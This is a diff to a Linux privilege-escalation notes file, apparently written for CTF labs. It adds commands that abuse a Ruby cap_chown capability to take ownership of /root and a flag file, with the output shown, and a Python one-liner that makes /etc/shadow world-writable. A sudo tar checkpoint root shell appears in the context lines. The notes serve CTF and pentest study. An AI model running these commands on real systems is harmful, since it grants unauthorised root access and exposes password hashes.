@@ -87,3 +87,30 @@ lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --ch
 tar: Removing leading `/' from member names
 # 
 ```
+
+
+## with capabilities ruby 
+
+ref:- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_chown
+
+```
+/usr/local/bin/ruby = cap_chown+ep
+```
+![rubyCapChown.png](rubyCapChown.png)
+
+pass id of user which is 1002 and location and get access to that file
+```ruby
+ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/root")'
+```
+
+```bash
+george@empline:/root$ ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/root/root.txt")'
+george@empline:/root$ cat root.txt 
+74fea7cd0556e9c6f22e6f54bc68f5d5
+george@empline:/root$ 
+```
+
+python:-
+```python
+python -c 'import os;os.chmod("/etc/shadow",0666)
+```
